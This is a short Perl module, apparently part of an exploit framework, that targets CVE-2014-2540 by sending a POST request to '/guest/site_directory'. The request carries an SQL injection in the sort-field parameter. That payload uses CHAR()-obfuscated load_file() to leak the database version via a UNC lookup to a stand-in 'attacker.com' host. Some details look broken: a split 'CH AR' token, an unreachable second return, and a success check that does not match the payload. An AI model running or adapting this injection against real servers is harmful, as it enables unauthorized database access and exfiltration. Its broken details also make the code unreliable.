package Exploit::CVE_2014_2540;

require Exporter;
our @ISA = qw( Exporter );
our @EXPORT = qw( run );

use Mojo;
use WEB; # вот это мой модуль

sub run($) {
	my $url = shift->clone;
	$url->path('/guest/site_directory');
	my $tx = WEB::request(
		method => 'POST',
		url => $url,
		get_params => {
			'active_form' => "site_directory_form",
			'ad_type_filter' => "text",
			'category_filter' => "1",
			'cost_model_filter' => "cpm",
			'form_mode' => "save",
			'image_size_filter' => "12",
			'keyword_filter' => "1",
			'site_directory_page' => "1",
			'site_directory_per_page' => "10",
			'site_directory_sort_direction' => "asc",
			'site_directory_sort_field' => "(select load_file(CONCAT(CHAR(92), CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107) ,CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CH AR(111), CHAR(111),CHAR(98),CHAR(97),CHAR(114))))"
		}
	);
	
	my $body = $tx->res->body;
	return $body =~ /Provider for SQL Server/;
	return 1;
}

1;
